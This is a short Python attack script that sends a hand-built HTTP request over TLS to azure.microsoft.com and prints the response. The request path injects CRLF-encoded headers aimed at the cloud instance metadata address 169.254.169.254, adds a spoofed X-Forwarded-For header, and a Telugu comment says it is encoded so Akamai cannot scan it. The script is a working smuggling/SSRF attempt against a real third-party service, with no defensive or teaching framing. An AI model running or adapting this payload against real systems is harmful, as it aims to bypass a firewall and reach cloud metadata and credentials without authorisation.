import socket
import ssl

host = "azure.microsoft.com"
port = 443

# 2030 "Gopher-Style" Smuggling Payload
# ఇది Akamai స్కాన్ చేయలేని విధంగా రిక్వెస్ట్ ని ఎన్కోడ్ చేస్తుంది
payload = (
    "GET /%0d%0aHost:%20169.254.169.254%0d%0aMetadata:%20true%0d%0a%0d%0a HTTP/1.1\r\n"
    "Host: azure.microsoft.com\r\n"
    "X-Forwarded-For: 131.107.255.255\r\n"
    "Connection: close\r\n"
    "\r\n"
)

context = ssl.create_default_context()
try:
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print(f"🚀 Deploying Gopher-Style Smuggling...")
            ssock.sendall(payload.encode())
            
            res = b""
            ssock.settimeout(10)
            while True:
                try:
                    data = ssock.recv(4096)
                    if not data: break
                    res += data
                except: break
            
            print("\n📥 Response Received:")
            print(res.decode(errors='ignore'))
except Exception as e:
    print(f"❌ Error: {e}")
